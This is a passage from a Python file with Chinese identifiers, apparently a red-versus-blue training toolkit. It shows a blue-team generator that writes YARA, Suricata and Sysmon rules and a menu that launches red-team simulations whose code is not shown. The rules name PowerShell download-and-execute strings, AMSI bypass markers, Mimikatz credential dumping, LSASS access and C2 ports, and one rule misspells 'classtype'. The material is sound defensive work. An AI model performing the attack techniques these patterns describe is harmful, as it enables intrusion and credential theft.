        $download4 = "Net.WebClient" ascii nocase

        $exec1 = "Invoke-Expression" ascii nocase
        $exec2 = "IEX" ascii
        $exec3 = "Start-Process" ascii nocase

        $encode1 = "FromBase64String" ascii nocase
        $encode2 = "base64" ascii nocase

        $amsi_bypass1 = "amsiInitFailed" ascii nocase
        $amsi_bypass2 = "AmsiUtils" ascii nocase

    condition:
        (2 of ($download*) and 1 of ($exec*)) or
        ($encode1 and $exec1) or
        any of ($amsi_bypass*)
}

rule Malicious_LNK_File
{
    meta:
        description = "检测恶意LNK快捷方式文件"
        author = "Blue Team"

    strings:
        $powershell = "powershell" ascii nocase
        $cmd = "cmd.exe" ascii nocase
        $wscript = "wscript" ascii nocase
        $download = "DownloadFile" ascii nocase
        $base64 = "-enc" ascii nocase
        $hidden = "-w hidden" ascii nocase
        $exec = "-exec bypass" ascii nocase

    condition:
        $powershell and (2 of ($download, $base64, $hidden, $exec))
}
"""
        self.生成的规则.append({
            "attack_id": "T1059.001",
            "名称": "恶意文件检测",
            "类型": "YARA",
            "规则": yara规则,
        })
        return yara规则

    def 生成suricata规则(self):
        """生成网络检测规则"""
        suricata规则 = """# 检测 C2 Beacon 通信模式
alert http any any -> any any (msg:"C2 Beacon Pattern - Regular Interval HTTP"; \
    flow:established,to_server; \
    content:"POST"; http_method; \
    content:"/api/v"; http_uri; \
    detection_filter:track by_src, count 5, seconds 300; \
    classtype:trojan-activity; sid:100001; rev:1;)

# 检测 DNS 隧道
alert dns any any -> any any (msg:"DNS Tunneling - Long Base32 Query"; \
    dns.query; \
    pcre:"/[a-z2-7]{30,}\.[-\w]+\.[-\w]+/"; \
    classtyle:trojan-activity; sid:100002; rev:1;)

# 检测 Mimikatz
alert http any any -> any any (msg:"Mimikatz sekurlsa Activity"; \
    flow:established; \
    content:"sekurlsa"; nocase; \
    content:"logonpasswords"; nocase; distance:50; \
    classtype:trojan-activity; sid:100003; rev:1;)

# 检测 PowerShell 下载
alert http any any -> any any (msg:"PowerShell WebClient Download"; \
    flow:established,to_server; \
    content:"WebClient"; nocase; \
    content:"DownloadFile"; nocase; distance:50; \
    classtype:trojan-activity; sid:100004; rev:1;)
"""
        self.生成的规则.append({
            "attack_id": "T1071.001",
            "名称": "C2网络通信检测",
            "类型": "Suricata",
            "规则": suricata规则,
        })
        return suricata规则

    def 生成sysmon配置(self):
        """生成 Sysmon 配置文件"""
        sysmon配置 = """<Sysmon schemaversion="4.82">
  <HashAlgorithms>SHA256</HashAlgorithms>

  <EventFiltering>

    <!-- 检测进程创建 -->
    <ProcessCreate onmatch="include">
      <!-- 可疑命令行 -->
      <CommandLine condition="contains">powershell</CommandLine>
      <CommandLine condition="contains">mimikatz</CommandLine>
      <CommandLine condition="contains">procdump</CommandLine>
      <CommandLine condition="contains">-enc</CommandLine>
      <CommandLine condition="contains">DownloadFile</CommandLine>
      <CommandLine condition="contains">Invoke-Expression</CommandLine>
    </ProcessCreate>

    <!-- 检测网络连接 -->
    <NetworkConnect onmatch="include">
      <!-- 检测 LSASS 网络连接 -->
      <Image condition="is">C:\\Windows\\System32\\lsass.exe</Image>
      <!-- 检测非常规端口连接 -->
      <DestinationPort condition="is">4444</DestinationPort>
      <DestinationPort condition="is">8443</DestinationPort>
      <DestinationPort condition="is">4443</DestinationPort>
    </NetworkConnect>

    <!-- 检测文件创建 -->
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">.exe</TargetFilename>
      <TargetFilename condition="contains">.dll</TargetFilename>
      <TargetFilename condition="contains">.bat</TargetFilename>
      <TargetFilename condition="end with">.ps1</TargetFilename>
      <TargetFilename condition="contains">Temp</TargetFilename>
    </FileCreate>

    <!-- 检测注册表修改（持久化） -->
    <RegistryEvent onmatch="include">
      <TargetObject condition="contains">Run\\</TargetObject>
      <TargetObject condition="contains">RunOnce</TargetObject>
      <TargetObject condition="contains">Userinit</TargetObject>
    </RegistryEvent>

    <!-- 检测 LSASS 访问 -->
    <ProcessAccess onmatch="include">
      <TargetImage condition="end with">lsass.exe</TargetImage>
    </ProcessAccess>

    <!-- 检测驱动加载 -->
    <DriverLoad onmatch="include">
      <Signed condition="is">false</Signed>
    </DriverLoad>

  </EventFiltering>
</Sysmon>
"""
        self.生成的规则.append({
            "attack_id": "Multiple",
            "名称": "Sysmon配置",
            "类型": "Sysmon",
            "规则": sysmon配置,
        })
        return sysmon配置

    def 生成覆盖率报告(self):
        """生成 ATT&CK 检测覆盖率报告"""
        print("\n" + "=" * 60)
        print("[蓝队] ATT&CK 检测覆盖率报告")
        print("=" * 60)

        # 红队使用的 ATT&CK 技术列表
        红队技术 = [
            ("T1566.002", "鱼叉钓鱼链接", "初始访问"),
            ("T1059.001", "PowerShell", "执行"),
            ("T1027", "混淆文件或信息", "防御绕过"),
            ("T1003.001", "LSASS内存", "凭据访问"),
            ("T1087.002", "域账户发现", "发现"),
            ("T1558.003", "Kerberoasting", "凭据访问"),
            ("T1550.002", "Pass the Hash", "横向移动"),
            ("T1003.006", "DCSync", "凭据访问"),
            ("T1053.005", "计划任务/Cron", "持久化"),
            ("T1071.001", "Web协议C2", "命令与控制"),
            ("T1070.004", "文件删除", "防御绕过"),
            ("T1562.001", "禁用安全工具", "防御绕过"),
        ]

        # 检查检测覆盖率
        已覆盖 = 0
        部分覆盖 = 0
        未覆盖 = 0

        print(f"\n  {'ATT&CK ID':<15} {'技术名称':<20} {'战术':<12} {'检测状态'}")
        print(f"  {'-'*15} {'-'*20} {'-'*12} {'-'*15}")

        for tech_id, 名称, 战术 in 红队技术:
            if tech_id in self.技术映射:
                状态 = "已覆盖"
                已覆盖 += 1
            elif tech_id in ["T1566.002", "T1027", "T1053.005", "T1071.001",
                             "T1070.004", "T1562.001", "T1087.002"]:
                状态 = "部分覆盖"
                部分覆盖 += 1
            else:
                状态 = "未覆盖"
                未覆盖 += 1

            print(f"  {tech_id:<15} {名称:<20} {战术:<12} {状态}")

        总数 = len(红队技术)
        print(f"\n  检测覆盖率:")
        print(f"    已覆盖: {已覆盖}/{总数} ({已覆盖/总数*100:.0f}%)")
        print(f"    部分覆盖: {部分覆盖}/{总数} ({部分覆盖/总数*100:.0f}%)")
        print(f"    未覆盖: {未覆盖}/{总数} ({未覆盖/总数*100:.0f}%)")

        # 改进建议
        print(f"\n  改进建议:")
        if 未覆盖 > 0:
            print(f"    [!] {未覆盖} 个技术未覆盖，需要补充检测规则")
        if 部分覆盖 > 0:
            print(f"    [!] {部分覆盖} 个技术部分覆盖，需要优化检测规则")
        print(f"    [*] 建议部署 EDR 增强端点行为检测")
        print(f"    [*] 建议部署 NDR 增强网络流量检测")
        print(f"    [*] 建议建立 SIEM 关联分析规则")

    def 生成所有规则(self):
        """生成所有检测规则"""
        print("\n" + "=" * 60)
        print("[蓝队] 检测规则生成器")
        print("=" * 60)

        # 生成 Sigma 规则
        for attack_id in self.技术映射:
            self.生成sigma规则(attack_id)
        print(f"  [+] 已生成 {len(self.技术映射)} 条 Sigma 规则")

        # 生成 YARA 规则
        self.生成yara规则()
        print(f"  [+] 已生成 YARA 规则")

        # 生成 Suricata 规则
        self.生成suricata规则()
        print(f"  [+] 已生成 Suricata 规则")

        # 生成 Sysmon 配置
        self.生成sysmon配置()
        print(f"  [+] 已生成 Sysmon 配置")

        # 生成覆盖率报告
        self.生成覆盖率报告()

        return self.生成的规则


# ============================================================
# 主程序
# ============================================================

def 主菜单():
    """主菜单"""
    print("""
╔══════════════════════════════════════════════╗
║        红蓝对抗实战案例集                      ║
╠══════════════════════════════════════════════╣
║  1. 钓鱼邮件初始访问模拟（红队）               ║
║  2. 域内横向移动模拟（红队）                   ║
║  3. Linux提权与持久化模拟（红队）              ║
║  4. 内网代理隧道穿透模拟（红队）               ║
║  5. 蓝队检测规则生成器（蓝队）                 ║
║  6. 执行全部案例                               ║
║  0. 退出                                       ║
╚══════════════════════════════════════════════╝
    """)
    return input("请选择 [0-6]: ").strip()


def 主程序():
    """主程序入口"""
    while True:
        选择 = 主菜单()

        if 选择 == "1":
            案例 = 钓鱼攻击模拟("target-company.com")
            案例.执行完整攻击链()
            蓝队建议 = 案例.生成蓝队检测规则()
            print(f"\n[蓝队] 检测建议: {蓝队建议}")

        elif 选择 == "2":
            案例 = 域内横向移动模拟()
            案例.执行完整横向移动()
            蓝队建议 = 案例.生成蓝队检测建议()
            print(f"\n[蓝队] 检测建议:")
            for 规则 in 蓝队建议["检测规则"]:
                print(f"  - {规则}")

        elif 选择 == "3":
            案例 = Linux提权与持久化模拟()
            案例.执行完整攻击链()

        elif 选择 == "4":
            案例 = 内网代理穿透模拟()
            案例.执行完整代理穿透()

        elif 选择 == "5":
            生成器 = 蓝队检测规则生成器()
            规则列表 = 生成器.生成所有规则()

        elif 选择 == "6":
            print("\n" + "=" * 60)
            print("执行全部案例")
            print("=" * 60)

            案例1 = 钓鱼攻击模拟("target-company.com")
            案例1.执行完整攻击链()

            案例2 = 域内横向移动模拟()
            案例2.执行完整横向移动()

            案例3 = Linux提权与持久化模拟()
            案例3.执行完整攻击链()

            案例4 = 内网代理穿透模拟()
            案例4.执行完整代理穿透()

            生成器 = 蓝队检测规则生成器()
            生成器.生成所有规则()

            print("\n" + "=" * 60)
            print("全部案例执行完成")
            print("=" * 60)

        elif 选择 == "0":
            print("退出程序")
            break


if __name__ == "__main__":
    主程序()
